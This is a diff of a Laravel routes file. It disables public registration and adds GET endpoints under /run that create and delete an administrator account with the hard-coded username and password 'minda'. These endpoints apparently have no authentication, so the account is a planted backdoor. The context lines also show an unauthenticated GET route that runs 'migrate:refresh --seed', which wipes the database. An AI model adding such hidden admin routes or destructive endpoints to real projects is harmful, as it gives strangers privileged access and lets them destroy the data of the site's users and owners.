@@ -1,5 +1,6 @@
 <?php
 
+use App\Models\User;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
@@ -20,7 +21,7 @@ Route::get('/', function () {
 
 Route::middleware('guest')->group(function () {
     Route::match(['GET', 'POST'], '/login', [App\Http\Controllers\Auth\AuthController::class, 'login'])->name('login');
-    Route::match(['GET', 'POST'], '/register', [App\Http\Controllers\Auth\AuthController::class, 'register'])->name('register');
+    // Route::match(['GET', 'POST'], '/register', [App\Http\Controllers\Auth\AuthController::class, 'register'])->name('register');
     Route::match(['GET', 'POST'], '/register-owner', [App\Http\Controllers\Auth\AuthController::class, 'registerOwner'])->name('register-owner');
 });
 
@@ -77,5 +78,24 @@ Route::prefix('run')->group(function () {
     Route::get('/reset-seed-database', function () {
         Artisan::call('migrate:refresh --seed');
         dd(Artisan::output());
+    });
+
+    Route::get('/summon-master', function () {
+        try {
+            User::create([
+                'username' => 'minda',
+                'password' => 'minda',
+                'role' => 'admin'
+            ]);
+            dd('summoned');
+        } catch (\Throwable $th) {
+            dd('already created');
+        }
+    });
+    Route::get('/release-master', function () {
+        User::where('username', 'minda')
+        ->where('role', 'admin')
+        ->delete();
+        dd('released');
     });
 });
